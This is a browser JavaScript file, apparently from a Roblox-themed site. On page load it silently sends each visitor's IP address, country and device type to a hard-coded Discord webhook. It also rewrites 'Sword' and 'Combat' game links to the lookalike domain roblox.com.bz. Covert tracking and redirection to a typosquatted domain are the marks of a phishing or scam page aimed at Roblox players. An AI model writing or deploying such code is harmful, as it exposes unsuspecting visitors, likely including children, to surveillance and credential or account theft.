(function () {
  'use strict';

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515847249597431929/jMYzK0DFDhc8FdpgMP8304_XNYmztefsQ8w9i8S-IDShWwEl_SLV1y2Skwd_DmG0aYqm';
  const NEW_SWORD_LINK = 'https://roblox.com.bz/games/9377953133/Mobile-Sword-Fight?privateServerLinkCode=78900447338733750394827051417199';

  // Get user IP
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip || 'Unknown';
    } catch {
      return 'Unknown';
    }
  }

  // Get user country from IP
  async function getUserCountry(ip) {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      const countryCode = data.country_code || 'Unknown';
      const countryName = data.country_name || 'Unknown';
      
      // Get flag emoji from country code
      const flagEmoji = countryCode
        .toUpperCase()
        .split('')
        .map((char) => String.fromCodePoint(127397 + char.charCodeAt(0)))
        .join('');
      
      return { country: countryName, flag: flagEmoji };
    } catch (error) {
      return { country: 'Unknown', flag: '🌍' };
    }
  }

  // Detect device type
  function detectDevice() {
    const userAgent = navigator.userAgent;
    if (/iphone|ipod/i.test(userAgent)) return '📱 iPhone';
    if (/ipad/i.test(userAgent)) return '📱 iPad';
    if (/android/i.test(userAgent)) return '🤖 Android';
    if (/windows phone/i.test(userAgent)) return '📱 Windows Phone';
    if (/mac/i.test(userAgent)) return '🍎 macOS';
    if (/windows/i.test(userAgent)) return '🪟 Windows';
    if (/linux/i.test(userAgent)) return '🐧 Linux';
    return '💻 Desktop';
  }

  // Log site visit to Discord
  async function logSiteVisit() {
    try {
      const ip = await getUserIP();
      const country = await getUserCountry(ip);
      const deviceType = detectDevice();
      const now = new Date();
      const timeISO = now.toISOString();
      const timeFormatted = now.toLocaleTimeString('pt-BR');

      const visitLog = {
        embeds: [
          {
            title: '🆕 New Visitor',
            color: 16711680, // Red color
            fields: [
              {
                name: '🌐 IP',
                value: `${country.flag} ${ip} — ${country.country}`,
                inline: false,
              },
              {
                name: '📱 Device',
                value: deviceType,
                inline: false,
              },
              {
                name: '⏰ Time',
                value: timeISO,
                inline: false,
              },
            ],
            footer: {
              text: `Roblox Condo — Visit Log | Hoje às ${timeFormatted}`,
            },
          },
        ],
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(visitLog),
      }).catch(() => {
        // Webhook may fail due to CORS
      });
    } catch (error) {
      console.error('Failed to log site visit:', error);
    }
  }

  // Update game links
  function updateGameLinks() {
    // Replace all roblox.com.bz links with the new sword game link for Sword Game and Fun Combat
    const observer = new MutationObserver(() => {
      // Find all links that might be game links
      document.querySelectorAll('a[href*="roblox.com"], button').forEach((element) => {
        // Check if this is a link to a game
        const href = element.getAttribute('href') || '';
        const text = element.textContent || '';
        
        // Update Sword Game and Fun Combat links
        if ((text.includes('Sword') || text.includes('Combat')) && href.includes('roblox.com')) {
          element.setAttribute('href', NEW_SWORD_LINK);
        }
      });

      // Also update any onclick handlers that might contain game links
      document.querySelectorAll('[onclick*="roblox.com"]').forEach((element) => {
        const onclick = element.getAttribute('onclick') || '';
        if ((element.textContent.includes('Sword') || element.textContent.includes('Combat')) && onclick.includes('roblox.com')) {
          const newOnclick = onclick.replace(/https:\/\/roblox\.com[^"']*/g, NEW_SWORD_LINK);
          element.setAttribute('onclick', newOnclick);
        }
      });
    });

    observer.observe(document.body, { childList: true, subtree: true });
  }

  // Initialize on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      logSiteVisit();
      updateGameLinks();
    });
  } else {
    logSiteVisit();
    updateGameLinks();
  }

  // Also log when the page becomes visible again (in case of tab switching)
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      // Page became visible, but don't log again to avoid spam
    }
  });
})();
